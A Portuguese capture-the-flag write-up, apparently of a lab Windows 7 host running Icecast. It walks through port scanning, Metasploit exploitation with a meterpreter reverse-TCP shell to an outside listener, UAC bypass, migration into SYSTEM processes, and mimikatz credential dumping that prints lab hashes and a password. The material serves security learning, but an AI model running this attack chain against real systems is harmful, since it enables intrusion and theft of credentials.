ROOM ICE

Executado varredura no alvo para enumeração de portas, serviços e vulnerabilidades

Portas:
135/tcp   open  msrpc          Microsoft Windows RPC
139/tcp   open  netbios-ssn    Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds   Microsoft Windows 7 - 10 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server?
5357/tcp  open  http           Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
8000/tcp  open  http           Icecast streaming media server
49152/tcp open  msrpc          Microsoft Windows RPC
49153/tcp open  msrpc          Microsoft Windows RPC
49154/tcp open  msrpc          Microsoft Windows RPC
49158/tcp open  msrpc          Microsoft Windows RPC
49159/tcp open  msrpc          Microsoft Windows RPC
49160/tcp open  msrpc          Microsoft Windows RPC

Hostname:
DARK-PC (workgroup)

Vulnerabilidades:
CVE-2004-1561 (Executed Code Overflow)
https://www.cvedetails.com/cve/CVE-2004-1561/

Exploit:
Icecast 2.0.1 (Win32) - Remote Code Execution (1)
https://www.exploit-db.com/exploits/568

Pesquisado exploit no Kali Linux (searchsploit) e encontrado o mesmo exploit e mais um.
Icecast 2.0.1 (Win32) - Remote Code Execution (1) -----> windows/remote/568.c
Icecast 2.0.1 (Win32) - Remote Code Execution (2) -----> windows/remote/573.c

Também há um módulo do (metasploit) para essa falha, então primeiramente utilizei o exploit o metasploit para fazer a exploração do alvo.
exploit/windows/http/icecast_header
payload/windows/meterpreter/reverse_tcp

Com a configuração abaixo de exploit + payload, obtive acesso ao alvo.
Module options (exploit/windows/http/icecast_header):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  10.10.229.185    yes       The target host(s), range CIDR identifier, or hosts file with syntax 'file:<path>'
   RPORT   8000             yes       The target port (TCP)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.9.185.104     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic

Mas a conexão que obtive é uma conexão sem privilégios de administrador (getuid).
Tentei executar uma escalação por dentro do meterpreter (getsystem), mas sem sucesso.

Com o comando (ps), podemos ver que o usuário DARK-PC\Dark está executando o Icecast no processo PID (2264).

Sistema operacional: Windows 7 (6.1 Build 7601, Service Pack 1)

Executado dentro do meterpreter um comando para identificação de possível exploits para post-exploitation (run post/multi/recon/local_exploit_suggester), e encontrei um exploit para usar.
exploit/windows/local/bypassuac_eventvwr

Coloquei a sessão meterpreter em background e executei o post-exploitation (exploit/windows/local/bypassuac_eventvwr).
 Id  Name  Type                     Information             Connection
  --  ----  ----                     -----------             ----------
  1         meterpreter x86/windows  Dark-PC\Dark @ DARK-PC  10.9.185.104:4444 -> 10.10.229.185:49230 (10.10.229.185)

Module options (exploit/windows/local/bypassuac_eventvwr):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION  1                yes       The session to run this module on.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.9.185.104     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows x86

Agora temos privilégios administrativos nos servidor.

Exdecutado o comando para verificar os privilégios extendidos (getprivs) e identificado que (SeTakeOwnershipPrivilege), tem permissão para assumir a propriedades de um arquivo.
meterpreter > getprivs

Enabled Process Privileges
==========================

Name
----
SeTakeOwnershipPrivilege

Com o comando (getsystem), consegui escalar privílégios de "NT AUTHORITY\SYSTEM" (getuid), mas não aceita o comando (hashdump), para coleta das hash de senha dos usuários. Necessário ousar outra técnica.

O serviço "lsass.exe" é o serviço responsável pela autenticação de usuários no Windows.

Com o comando (ps), encontrado o processo do "lsass".
700   592   lsass.exe             x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\lsass.exe

Para manipular o processo "lsass", necessito migrar meu processo de invasão para dentro de outro processo que tenha as mesmas permissões (NT AUTHORITY\SYSTEM), usado o processo do pool de impressão (spoolsv.exe
1368  692   spoolsv.exe           x64   0        NT AUTHORITY\SYSTEM           C:\Windows\System32\spoolsv.exe

Migrado o nosso processo de invasão para dentro do processo do pool de impressão.
migrate -N spoolsv.exe

Após esse processo de migração ao executar o comando (getuid), nosso usuário deixará de ser o "DARK-PC\Dark" e passará a ser "NT AUTHORITY\SYSTEM"

Executado o "mimikatz" através do módulo (kiwi) do meterpreter.
meterpreter > load kiwi
Loading extension kiwi...
  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
 '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/
Success.

Meterpreter >

Com o comando (help), temos uma lista completa de comandos e mais informações.

Executado o comando (creds_all) para recuperação de todas as hash de senhas e das senhas.
meterpreter > creds_all
[===============
Username  Domain   LM                                NTLM                              SHA1
--------  ------   --                                ----                              ----
Dark      Dark-PC  e52cac67419a9a22ecb08369099ed302  7c4fe5eada682714a036e39378362bab  0d082c4b4f2aeafb67fd0ea568a997e9d3ebc0eb

Username  Domain   Password
--------  ------   --------
Dark      Dark-PC  Password01!

Agora que tenho a senha, fiz a conexão via RDP no alvo, mas primeiro foi necessário habilitar o RDP no alvo, através do comando 
(run post/windows/manage/enable_rdp) dentro do meterpreter.

Finalizado!

=============================================================================================================================================

Exploração manual via Exploit-DB

Usado o exploit "Icecast 2.0.1 (Win32) - Remote Code Execution (1)"
https://www.exploit-db.com/exploits/568

Que tem disponível dentro do Kali Linux, mas é um exploit para Windows, pois não compila no Kali.
Li a documentação interna do código e ele necessita de um Windows com o "nc/ncat" para ficar com a porta 9999 em listening + IDE com GCC para compilação do código em .EXE.
